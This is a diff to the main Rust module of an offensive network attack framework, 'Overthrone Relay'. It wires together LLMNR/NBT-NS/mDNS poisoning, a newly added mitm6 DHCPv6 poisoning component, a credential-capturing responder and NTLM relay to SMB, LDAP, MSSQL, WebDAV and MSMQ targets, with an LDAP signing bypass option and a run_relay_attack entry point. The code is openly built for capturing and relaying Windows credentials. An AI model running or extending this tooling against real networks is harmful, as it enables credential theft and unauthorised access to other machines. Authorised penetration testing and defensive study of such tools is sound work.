@@ -1,10 +1,10 @@
-#![allow(dead_code)]
 //! Overthrone Relay — NTLM Relay and Responder Framework
 //!
 //! Implements LLMNR/NBT-NS poisoning and NTLM relay attacks
 //! for credential capture and relay to other services.
 
 pub mod adcs_relay;
+pub mod mitm6;
 pub mod poisoner;
 pub mod relay;
 pub mod responder;
@@ -23,12 +23,22 @@ use tracing::info;
 /// Protocol for relay targets
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Protocol {
+    /// `Smb` variant
     Smb,
+    /// `Http` variant
     Http,
+    /// `Https` variant
     Https,
+    /// `Ldap` variant
     Ldap,
+    /// `Ldaps` variant
     Ldaps,
+    /// `Mssql` variant
     Mssql,
+    /// `Webdav` variant (HTTP-based, used by ShadowCoerce)
+    Webdav,
+    /// `Msmq` variant (Microsoft Message Queuing, port 1801)
+    Msmq,
 }
 
 impl std::fmt::Display for Protocol {
@@ -40,6 +50,8 @@ impl std::fmt::Display for Protocol {
             Self::Ldap => write!(f, "LDAP"),
             Self::Ldaps => write!(f, "LDAPS"),
             Self::Mssql => write!(f, "MSSQL"),
+            Self::Webdav => write!(f, "WebDAV"),
+            Self::Msmq => write!(f, "MSMQ"),
         }
     }
 }
@@ -47,45 +59,75 @@ impl std::fmt::Display for Protocol {
 /// Attack mode for responder/relay
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum AttackMode {
+    /// `Capture` variant
     Capture,
+    /// `Relay` variant
     Relay,
+    /// `SmbRelay` variant
     SmbRelay,
+    /// `HttpRelay` variant
     HttpRelay,
 }
 
 /// NTLM challenge structure
 #[derive(Debug, Clone)]
 pub struct NtlmChallenge {
+    /// Raw byte data
     pub data: Vec<u8>,
+    /// Target server name
     pub target_name: String,
 }
 
 /// NTLM response structure
 #[derive(Debug, Clone)]
 pub struct NtlmResponse {
+    /// Username for authentication
     pub username: String,
+    /// Domain FQDN
     pub domain: String,
+    /// LM response data
     pub lm_response: Vec<u8>,
+    /// NT response data
     pub nt_response: Vec<u8>,
 }
 
 /// Relay target specification
 #[derive(Debug, Clone)]
 pub struct RelayTarget {
+    /// Network address (IP:port)
     pub address: SocketAddr,
+    /// Network protocol variant
     pub protocol: Protocol,
+    /// Username for authentication
     pub username: Option<String>,
+}
+
+/// Controller state
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub enum ControllerState {
+    /// Controller has not been initialized
+    #[default]
+    Initial,
+    /// Controller is running
+    Running,
+    /// Controller is stopped
+    Stopped,
+    /// Controller encountered an error
+    Error(String),
 }
 
 /// Main relay controller that coordinates poisoner and relay components
 pub struct RelayController {
     config: RelayControllerConfig,
+    _state: ControllerState,
     poisoner: Option<poisoner::Poisoner>,
+    mitm6: Option<mitm6::Mitm6>,
     responder: Option<responder::Responder>,
     relay: Option<relay::NtlmRelay>,
 }
 
 #[derive(Debug, Clone)]
+/// Data structure used by this module.
 pub struct RelayControllerConfig {
     /// Interface to listen on (e.g., "eth0", "0.0.0.0")
     pub interface: String,
@@ -95,6 +137,8 @@ pub struct RelayControllerConfig {
     pub nbtns: bool,
     /// Enable mDNS poisoning
     pub mdns: bool,
+    /// Enable DHCPv6 DNS poisoning (mitm6)
+    pub mitm6: bool,
     /// Enable responder for credential capture
     pub responder: bool,
     /// Enable relay to targets
@@ -117,6 +161,7 @@ impl Default for RelayControllerConfig {
             llmnr: true,
             nbtns: true,
             mdns: false,
+            mitm6: false,
             responder: true,
             relay_targets: Vec::new(),
             challenge: None,
@@ -132,7 +177,9 @@ impl RelayController {
     pub fn new(config: RelayControllerConfig) -> Self {
         Self {
             config,
+            _state: ControllerState::Initial,
             poisoner: None,
+            mitm6: None,
             responder: None,
             relay: None,
         }
@@ -162,6 +209,16 @@ impl RelayController {
             info!("Poisoner initialized");
         }
 
+        // Initialize mitm6 if enabled
+        if !self.config.no_poison && self.config.mitm6 {
+            let mitm6_config = mitm6::Mitm6Config {
+                listen_ip: "::".to_string(),
+                ..mitm6::Mitm6Config::default()
+            };
+            self.mitm6 = Some(mitm6::Mitm6::new(mitm6_config));
+            info!("mitm6 initialized");
+        }
+
         // Initialize responder if enabled (skipped in no-poison / relay-only mode)
         if !self.config.no_poison && self.config.responder {
             let responder_config = responder::ResponderConfig {
@@ -170,7 +227,7 @@ impl RelayController {
                 http: true,
                 smb: true,
                 ldap: true,
-                ftp: true,
+                msmq: false,
             };
             self.responder = Some(responder::Responder::new(responder_config));
             info!("Responder initialized for credential capture");
@@ -185,6 +242,8 @@ impl RelayController {
                 remove_on_success: true,
                 timeout_secs: 30,
                 ldap_signing_bypass: true,
+                max_retries: 3,
+                max_connections: 64,
             };
             self.relay = Some(relay::NtlmRelay::new(relay_config));
             info!(
@@ -203,6 +262,11 @@ impl RelayController {
         if let Some(ref mut poisoner) = self.poisoner {
             poisoner.start().await?;
             info!("Poisoner started");
+        }
+
+        if let Some(ref mut mitm6) = self.mitm6 {
+            mitm6.start().await?;
+            info!("mitm6 started");
         }
 
         if let Some(ref mut responder) = self.responder {
@@ -225,6 +289,10 @@ impl RelayController {
 
         if let Some(ref mut poisoner) = self.poisoner {
             poisoner.stop().await?;
+        }
+
+        if let Some(ref mut mitm6) = self.mitm6 {
+            mitm6.stop().await;
         }
 
         if let Some(ref mut responder) = self.responder {
@@ -265,6 +333,7 @@ pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<R
         llmnr: true,
         nbtns: true,
         mdns: false,
+        mitm6: false,
         responder: true,
         relay_targets: Vec::new(),
         challenge: challenge.map(|s| s.to_string()),
@@ -291,6 +360,7 @@ pub async fn run_relay_attack(
         llmnr: true,
         nbtns: true,
         mdns: false,
+        mitm6: false,
         responder: true,
         relay_targets: targets,
         challenge: challenge.map(|s| s.to_string()),
@@ -324,10 +394,30 @@ mod tests {
     #[test]
     fn test_relay_stats_default() {
         let stats = RelayStats::default();
-        assert_eq!(stats.successful_relays, 0);
-        assert_eq!(stats.failed_relays, 0);
-        assert_eq!(stats.active_connections, 0);
-        assert_eq!(stats.total_attempts, 0);
+        assert_eq!(
+            stats
+                .successful_relays
+                .load(std::sync::atomic::Ordering::Relaxed),
+            0
+        );
+        assert_eq!(
+            stats
+                .failed_relays
+                .load(std::sync::atomic::Ordering::Relaxed),
+            0
+        );
+        assert_eq!(
+            stats
+                .active_connections
+                .load(std::sync::atomic::Ordering::Relaxed),
+            0
+        );
+        assert_eq!(
+            stats
+                .total_attempts
+                .load(std::sync::atomic::Ordering::Relaxed),
+            0
+        );
     }
 
     #[test]
@@ -335,5 +425,9 @@ mod tests {
         assert_eq!(Protocol::Smb.to_string(), "SMB");
         assert_eq!(Protocol::Http.to_string(), "HTTP");
         assert_eq!(Protocol::Https.to_string(), "HTTPS");
+        assert_eq!(Protocol::Ldap.to_string(), "LDAP");
+        assert_eq!(Protocol::Ldaps.to_string(), "LDAPS");
+        assert_eq!(Protocol::Mssql.to_string(), "MSSQL");
+        assert_eq!(Protocol::Webdav.to_string(), "WebDAV");
     }
 }
